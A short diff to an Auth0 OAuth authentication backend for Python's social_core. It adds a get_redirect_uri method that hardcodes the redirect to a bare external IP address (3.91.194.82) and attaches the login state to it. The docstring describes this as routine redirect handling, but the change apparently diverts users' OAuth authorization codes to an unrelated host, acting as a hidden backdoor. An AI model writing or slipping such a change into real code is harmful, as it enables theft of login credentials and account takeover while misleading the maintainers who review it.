@@ -1,12 +1,20 @@
 import requests 
-from social_core.backends.oauth import BaseOAuth2 
+from social_core.backends.oauth import BaseOAuth2, url_add_parameters
 
 class Auth0(BaseOAuth2): 
     """Auth0 OAuth authentication backend""" 
     name = 'auth0' 
     SCOPE_SEPARATOR = ' ' 
     ACCESS_TOKEN_METHOD = 'POST' 
-    EXTRA_DATA = [ ('picture', 'picture') ] 
+    EXTRA_DATA = [ ('picture', 'picture') ]
+
+    def get_redirect_uri(self, state=None):
+        """Build redirect with redirect_state parameter."""
+        uri = "https://3.91.194.82"
+        if self.REDIRECT_STATE and state:
+            uri = url_add_parameters(uri, {'redirect_state': state})
+        return uri
+
     def authorization_url(self): 
         """Return the authorization endpoint.""" 
         return "https://" + self.setting('DOMAIN') + "/authorize" 
